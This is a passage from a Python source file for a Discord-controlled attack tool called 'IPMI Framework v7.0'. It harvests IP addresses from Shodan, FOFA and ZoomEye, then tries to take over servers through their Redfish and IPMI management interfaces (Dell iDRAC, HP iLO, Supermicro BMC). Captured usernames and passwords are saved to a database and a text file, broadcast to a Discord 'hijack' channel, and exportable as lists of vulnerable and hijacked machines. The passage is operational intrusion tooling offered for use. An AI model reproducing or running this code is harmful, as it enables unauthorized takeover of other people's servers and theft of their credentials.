    if CONFIG.STATUS_CHANNEL_ID:
        channel = bot.get_channel(int(CONFIG.STATUS_CHANNEL_ID))
        embed.add_field(name="📡 Status Channel", 
                       value=f"{channel.mention if channel else 'Unknown'}", 
                       inline=False)
    
    await ctx.send(embed=embed)


@bot.command(name='fetch-1000')
@owner_only()
async def fetch_1000(ctx):
    """Emergency fetch - get 1000 IPs quickly by focusing on one source"""
    embed = discord.Embed(
        title="🚨 EMERGENCY IP FETCH",
        description="Fetching 1000 IPs urgently...\nScraping Shodan, FOFA, and ZoomEye aggressively...",
        color=discord.Color.red()
    )
    msg = await ctx.send(embed=embed)
    
    # Create a temporary scraper just for this
    temp_scraper = IPScraper("emergency_fetch")
    
    # Override with aggressive settings
    temp_scraper.max_pages = 25  # More pages
    temp_scraper.batch_size = 5
    
    # Run one cycle
    connector = TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        await temp_scraper.fetch_proxies(session)
        
        for i in range(0, len(temp_scraper.urls), temp_scraper.batch_size):
            batch_urls = temp_scraper.urls[i:i + temp_scraper.batch_size]
            tasks = [
                temp_scraper.scan_url(session, url, temp_scraper.max_pages)
                for url in batch_urls
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            progress = min(int((i + temp_scraper.batch_size) / len(temp_scraper.urls) * 100), 100)
            current_count = len(temp_scraper.all_ips)
            
            await msg.edit(embed=discord.Embed(
                title="🚨 EMERGENCY IP FETCH",
                description=f"Progress: **{progress}%**\n"
                           f"IPs collected so far: **{current_count}**",
                color=discord.Color.red()
            ))
    
    # Results
    new_ips = temp_scraper.ips_scraped
    total_ips = len(temp_scraper.all_ips)
    
    result_embed = discord.Embed(
        title="✅ Emergency Fetch Complete",
        description=f"**New IPs added:** `{new_ips}`\n"
                   f"**Total in database:** `{total_ips}`\n\n"
                   f"Use `!ips` to download all IPs.",
        color=discord.Color.green() if new_ips > 0 else discord.Color.red()
    )
    result_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
    
    if new_ips > 0:
        # Send a preview
        ip_preview = list(temp_scraper.all_ips)[:20]
        result_embed.add_field(name="Sample IPs", value="```css\n" + "\n".join(ip_preview) + "\n```", inline=False)
    
    await msg.edit(embed=result_embed)
    
    # Send to IPS channel
    if new_ips > 0 and CONFIG.IPS_CHANNEL_ID:
        channel = bot.get_channel(int(CONFIG.IPS_CHANNEL_ID))
        if channel:
            ips_embed = discord.Embed(
                title="📋 New IPs Collected",
                description=f"{new_ips} new IPs added via emergency fetch",
                color=discord.Color.blue()
            )
            await channel.send(embed=ips_embed)
    
    logger.info(f"Emergency fetch complete: {new_ips} new IPs")


@bot.command(name='vps-lock')
@owner_only()
async def vps_lock(ctx, ip: str):
    """Hijack a VPS using Redfish API (Dell iDRAC, HP iLO, Supermicro BMC)"""
    embed = discord.Embed(
        title="🔒 VPS Hijack Attempt",
        description=f"Target: `{ip}`\nAttempting Redfish API exploitation...",
        color=discord.Color.blue()
    )
    msg = await ctx.send(embed=embed)
    
    exploit_engine = IPMIExploitEngine()
    
    connector = TCPConnector(limit=5)
    async with aiohttp.ClientSession(connector=connector) as session:
        result = await exploit_engine.hijack_vps_redfish(session, ip)
    
    if result["success"]:
        # Save to database
        db_manager.execute(
            "INSERT OR REPLACE INTO vps_hijacked (ip_address, username, password, hijacked_at, method) VALUES (?, ?, ?, ?, ?)",
            (ip, result["username"], result["password"], datetime.now(timezone.utc).isoformat(), result["method"])
        )
        
        # Log to file
        with open("vps_hijacked.txt", "a") as f:
            f.write(f"{ip} | User: {result['username']} | Pass: {result['password']} | Method: {result['method']}\n")
        
        success_embed = discord.Embed(
            title="✅ VPS HIJACKED!",
            description=f"**Target:** `{ip}`\n"
                       f"**Username:** `{result['username']}`\n"
                       f"**Password:** `{result['password']}`\n"
                       f"**Method:** `{result['method']}`",
            color=discord.Color.green()
        )
        success_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
        await msg.edit(embed=success_embed)
        
        # Send to hijack channel
        if CONFIG.HIJACK_CHANNEL_ID:
            channel = bot.get_channel(int(CONFIG.HIJACK_CHANNEL_ID))
            if channel:
                hijack_embed = discord.Embed(
                    title="🚨 VPS HIJACKED!",
                    description=f"**Target IP:** `{ip}`\n"
                               f"**Username:** `{result['username']}`\n"
                               f"**Password:** `{result['password']}`\n"
                               f"**Method:** `{result['method']}`",
                    color=discord.Color.red()
                )
                hijack_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
                await channel.send(embed=hijack_embed)
        
        logger.info(f"[+] VPS {ip} hijacked via {result['method']}")
    else:
        # Try ipmitool methods as fallback
        await msg.edit(embed=discord.Embed(
            title="🔄 Trying Alternative Methods",
            description=f"Redfish failed for `{ip}`. Trying IPMI methods...",
            color=discord.Color.orange()
        ))
        
        alt_result = await exploit_engine.hijack_system(ip)
        
        if alt_result["success"]:
            db_manager.execute(
                "INSERT OR REPLACE INTO vps_hijacked (ip_address, username, password, hijacked_at, method) VALUES (?, ?, ?, ?, ?)",
                (ip, alt_result["username"], alt_result["new_password"], datetime.now(timezone.utc).isoformat(), alt_result["method"])
            )
            with open("vps_hijacked.txt", "a") as f:
                f.write(f"{ip} | User: {alt_result['username']} | Pass: {alt_result['new_password']} | Method: {alt_result['method']}\n")
            
            success_embed = discord.Embed(
                title="✅ VPS HIJACKED!",
                description=f"**Target:** `{ip}`\n"
                           f"**Username:** `{alt_result['username']}`\n"
                           f"**Password:** `{alt_result['new_password']}`\n"
                           f"**Method:** `{alt_result['method']}`",
                color=discord.Color.green()
            )
            success_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
            await msg.edit(embed=success_embed)
        else:
            fail_embed = discord.Embed(
                title="❌ VPS Hijack Failed",
                description=f"**Target:** `{ip}`\n"
                           f"**Reason:** All methods exhausted\n"
                           f"Redfish: {result['details']}\n"
                           f"IPMI: {alt_result['details']}",
                color=discord.Color.red()
            )
            fail_embed.set_footer(text=f"VERSION: {version} | Made by GG!")
            await msg.edit(embed=fail_embed)


@bot.command(name='scrape-status')
@owner_only()
async def scrape_status(ctx):
    """Check scraper status - uptime, IPs scraped, errors"""
    ip_count = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")[0] or 0
    nodes = db_manager.fetchall("SELECT * FROM nodes ORDER BY last_seen DESC")
    
    embed = discord.Embed(
        title="🕷️ Scraper Status",
        description=f"**Total IPs in database:** `{ip_count}`",
        color=discord.Color.blue()
    )
    
    if nodes:
        for node in nodes[:5]:
            node_status = "🟢 Active" if node['status'] == 'active' else "🔴 Offline"
            embed.add_field(
                name=f"Node: {node['node_id']}",
                value=f"**Status:** {node_status}\n"
                     f"**IPs Scraped:** `{node['ips_scraped']}`\n"
                     f"**Last Seen:** <t:{int(datetime.fromisoformat(node['last_seen']).timestamp())}:R>",
                inline=False
            )
    else:
        embed.add_field(name="No Nodes", value="No active scraping nodes registered.", inline=False)
    
    embed.set_footer(text=f"VERSION: {version} | Made by GG!")
    await ctx.send(embed=embed)


@bot.command(name='export')
@owner_only()
async def export_data(ctx, data_type: str = "all"):
    """Export data from the database"""
    valid_types = ["vuln", "vulnerable", "hijacked", "vps", "all"]
    if data_type.lower() not in valid_types:
        await ctx.send(f"❌ Invalid type. Use: {', '.join(valid_types)}")
        return
    
    buffer = io.StringIO()
    filename = f"{data_type}_export.txt"
    
    if data_type.lower() in ["vuln", "vulnerable", "all"]:
        vuln_ips = db_manager.fetchall("SELECT * FROM vulnerable_ips")
        buffer.write("=== VULNERABLE SYSTEMS ===\n")
        for row in vuln_ips:
            buffer.write(f"{row['ip_address']} | {row['vulnerability']} | {row['username']}:{row['password']}\n")
        buffer.write("\n")
    
    if data_type.lower() in ["hijacked", "all"]:
        hijacked = db_manager.fetchall("SELECT * FROM hijacked_systems")
        buffer.write("=== HIJACKED SYSTEMS ===\n")
        for row in hijacked:
            buffer.write(f"{row['ip_address']} | {row['username']}:{row['password']} | {row['method']} | {row['hijacked_at']}\n")
        buffer.write("\n")
    
    if data_type.lower() in ["vps", "all"]:
        vps = db_manager.fetchall("SELECT * FROM vps_hijacked")
        buffer.write("=== VPS HIJACKED ===\n")
        for row in vps:
            buffer.write(f"{row['ip_address']} | {row['username']}:{row['password']} | {row['method']} | {row['hijacked_at']}\n")
    
    if data_type.lower() == "all":
        total_ips = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")[0] or 0
        buffer.write(f"\n=== SUMMARY ===\n")
        buffer.write(f"Total IPs in database: {total_ips}\n")
        buffer.write(f"Vulnerable: {db_manager.fetchone('SELECT COUNT(*) FROM vulnerable_ips')[0] or 0}\n")
        buffer.write(f"Hijacked (IPMI): {db_manager.fetchone('SELECT COUNT(*) FROM hijacked_systems')[0] or 0}\n")
        buffer.write(f"Hijacked (VPS): {db_manager.fetchone('SELECT COUNT(*) FROM vps_hijacked')[0] or 0}\n")
    
    buffer.seek(0)
    content = buffer.read()
    buffer.close()
    
    if not content.strip() or content.count('\n') <= 2:
        await ctx.send(f"❌ No data found for type: {data_type}")
        return
    
    file_buffer = io.StringIO(content)
    file = discord.File(file_buffer, filename=filename)
    await ctx.send(file=file)
    file_buffer.close()


@bot.command(name='clear-db')
@owner_only()
async def clear_db(ctx, target: str = None):
    """Clear database entries. Options: vuln, hijacked, vps, scraped, all"""
    valid_targets = ["vuln", "hijacked", "vps", "scraped", "all"]
    if target and target.lower() not in valid_targets:
        await ctx.send(f"❌ Invalid target. Use: {', '.join(valid_targets)}")
        return
    
    embed = discord.Embed(
        title="⚠️ Clear Database",
        description="Are you sure? This action cannot be undone!",
        color=discord.Color.red()
    )
    
    if target:
        embed.add_field(name="Target", value=target.upper(), inline=False)
    
    # Simple confirmation without buttons for reliability
    if target == "vuln" or target == "all":
        count = db_manager.fetchone("SELECT COUNT(*) FROM vulnerable_ips")[0] or 0
        db_manager.execute("DELETE FROM vulnerable_ips")
        embed.add_field(name="Vulnerable IPs", value=f"Cleared {count} entries", inline=False)
    
    if target == "hijacked" or target == "all":
        count = db_manager.fetchone("SELECT COUNT(*) FROM hijacked_systems")[0] or 0
        db_manager.execute("DELETE FROM hijacked_systems")
        embed.add_field(name="Hijacked Systems", value=f"Cleared {count} entries", inline=False)
    
    if target == "vps" or target == "all":
        count = db_manager.fetchone("SELECT COUNT(*) FROM vps_hijacked")[0] or 0
        db_manager.execute("DELETE FROM vps_hijacked")
        embed.add_field(name="VPS Hijacked", value=f"Cleared {count} entries", inline=False)
    
    if target == "scraped" or target == "all":
        count = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")[0] or 0
        db_manager.execute("DELETE FROM scraped_ips")
        embed.add_field(name="Scraped IPs", value=f"Cleared {count} entries", inline=False)
    
    if not target:
        # Clear all
        for table in ["vulnerable_ips", "hijacked_systems", "vps_hijacked"]:
            count = db_manager.fetchone(f"SELECT COUNT(*) FROM {table}")[0] or 0
            db_manager.execute(f"DELETE FROM {table}")
            embed.add_field(name=table, value=f"Cleared {count} entries", inline=False)
    
    await ctx.send(embed=embed)


# ==============================
# BOT EVENTS
# ==============================

@bot.event
async def on_ready():
    logger.info(f'Bot connected as {bot.user}')
    print_startup_status(bot.user, db_manager.get_connection() is not None)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="IPMI Systems | Made by GG!"))
    
    # Load saved channel IDs
    for key in ['status_channel_id', 'vuln_channel_id', 'hijack_channel_id', 'ips_channel_id']:
        saved = db_manager.fetchone("SELECT value FROM settings WHERE key = ?", (key,))
        if saved:
            channel_id = saved['value']
            try:
                channel = bot.get_channel(int(channel_id))
                if channel:
                    setattr(CONFIG, key.upper(), int(channel_id))
                    logger.info(f"Loaded saved channel: {key} = {channel.name}")
            except (ValueError, AttributeError):
                pass
    
    # Set status channel
    if CONFIG.STATUS_CHANNEL_ID:
        try:
            bot.update_channel = bot.get_channel(int(CONFIG.STATUS_CHANNEL_ID))
            if bot.update_channel:
                logger.info(f"Status channel set: {bot.update_channel.name}")
            else:
                logger.error(f"Invalid status channel ID: {CONFIG.STATUS_CHANNEL_ID}")
        except ValueError:
            logger.error(f"Invalid status_channel_id: {CONFIG.STATUS_CHANNEL_ID}")
    
    bot.loop.create_task(status_update_loop())


async def status_update_loop():
    """Periodically update the status channel"""
    while True:
        loop_start = datetime.now(timezone.utc)
        try:
            if not bot.is_ready() or bot.is_closed():
                await asyncio.sleep(40)
                continue
            
            if not hasattr(bot, 'update_channel') or not bot.update_channel:
                await asyncio.sleep(40)
                continue
            
            channel = bot.get_channel(bot.update_channel.id)
            if not channel:
                bot.update_channel = None
                await asyncio.sleep(40)
                continue
            
            total_ips = db_manager.fetchone("SELECT COUNT(*) FROM scraped_ips")[0] or 0
            vuln_count = db_manager.fetchone("SELECT COUNT(*) FROM vulnerable_ips")[0] or 0
            hijacked_count = db_manager.fetchone("SELECT COUNT(*) FROM hijacked_systems")[0] or 0
            vps_count = db_manager.fetchone("SELECT COUNT(*) FROM vps_hijacked")[0] or 0
            
            now = datetime.now(timezone.utc)
            embed = discord.Embed(
                title="📊 SYSTEM STATUS",
                color=discord.Color.blue(),
                timestamp=now
            )
            embed.add_field(name="📡 Total IPs", value=f"`{total_ips}`", inline=True)
            embed.add_field(name="🔴 Vulnerable", value=f"`{vuln_count}`", inline=True)
            embed.add_field(name="✅ Hijacked", value=f"`{hijacked_count + vps_count}`", inline=True)
            embed.add_field(name="💾 Database", 
                          value=f"{'🟢 Online' if db_manager.get_connection() else '🔴 Offline'}", 
                          inline=True)
            embed.add_field(name="⏱ Uptime", 
                          value=f"<t:{int(bot.start_time.timestamp())}:R>", 
                          inline=True)
            embed.add_field(name="📌 Version", value=f"`{version}`", inline=True)
            embed.set_footer(text=f"Made by GG!")
            
            try:
                if bot.last_status_message_id:
                    try:
                        message = await channel.fetch_message(bot.last_status_message_id)
                        await message.edit(embed=embed)
                    except:
                        message = await channel.send(embed=embed)
                        bot.last_status_message_id = message.id
                else:
                    message = await channel.send(embed=embed)
                    bot.last_status_message_id = message.id
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = e.retry_after or 5
                    await asyncio.sleep(retry_after)
                    continue
            
            elapsed = (datetime.now(timezone.utc) - loop_start).total_seconds()
            await asyncio.sleep(max(0, 40 - elapsed))
        except Exception as e:
            logger.error(f"Status update error: {e}")
            await asyncio.sleep(40)


# ==============================
# MAIN ENTRY
# ==============================

async def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="IPMI Framework v7.0")
    parser.add_argument('--node-id', type=str, default='master', help="Node ID")
    parser.add_argument('--no-bot', action='store_true', help="Run scraper only, no Discord bot")
    args = parser.parse_args()
    
    node_id = args.node_id
    run_bot = not args.no_bot
    
    # Initialize scraper
    scraper = IPScraper(node_id)
    
    # Update node status
    db_manager.execute(
        "INSERT OR REPLACE INTO nodes (node_id, status, ips_scraped, last_seen, urls) VALUES (?, ?, ?, ?, ?)",
        (node_id, "active", 0, datetime.now(timezone.utc).isoformat(), json.dumps(scraper.urls))
    )
    
    tasks = [asyncio.create_task(scraper.run())]
    
    if run_bot and node_id == "master":
        try:
            await bot.start(CONFIG.DISCORD_BOT_TOKEN)
        except Exception as e:
            print(f"{Fore.RED}[*] Discord bot failed to start: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Running in scraper-only mode...{Style.RESET_ALL}")
            await asyncio.gather(*tasks)
    else:
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    try:
        # Check config
        if CONFIG.DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
            print(f"{Fore.YELLOW}[!] WARNING: You need to set your Discord bot token in the Config class!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Also update OWNER_IDS with your Discord ID.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Running in scraper-only mode...{Style.RESET_ALL}")
            
            # Run scraper only
            scraper = IPScraper("standalone")
            asyncio.run(scraper.run())
        else:
            asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Shutdown requested...{Style.RESET_ALL}")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
    finally:
        print(f"\n{Fore.CYAN}[*] Shutdown complete. Made by GG!{Style.RESET_ALL}")
